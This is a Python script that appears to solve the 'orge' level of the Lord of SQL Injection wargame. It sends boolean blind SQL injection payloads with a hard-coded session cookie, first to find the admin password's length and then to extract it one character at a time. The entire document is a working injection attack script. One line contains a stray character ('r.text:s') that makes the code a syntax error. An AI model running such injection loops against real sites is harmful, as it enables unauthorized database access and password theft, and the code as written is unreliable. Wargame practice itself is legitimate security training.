import urllib3
import requests
import time

flag = ""
length = 1
result = ""

session = dict(PHPSESSID="6s4gd2rk2ag909aqjv2nmcpbfp")

# find the length of PassWord
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=%27%20%7c%7c%20id=%27admin%27%20%26%26%20length(pw)="+str(i)+"%23", cookies=session)
    except:
        print("exception_length")
        continue
        # select id from prob_orge where id='guest' and pw='' || id='admin' && length(pw)=8#

    if 'Hello admin' in r.text:
        length = i
        break

print("[+] Length of admin PW : " + str(length))
print("[+] ----------------------------------------[+]")

for k in range(1, length+1):
    for j in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=%27%20%7c%7c%20id=%27admin%27%20%26%26%20ascii(substr(pw,"+str(k)+",1))="+str(j)+"%23", cookies=session)
        except:
            print("exception_flag")
            continue
        if 'Hello admin' in r.text:s
            flag = flag + chr(j)
            print("[+] finding PW : " + flag)
        time.sleep(0.1)

result = flag.lower()
print("[+] pw of admin : " + result)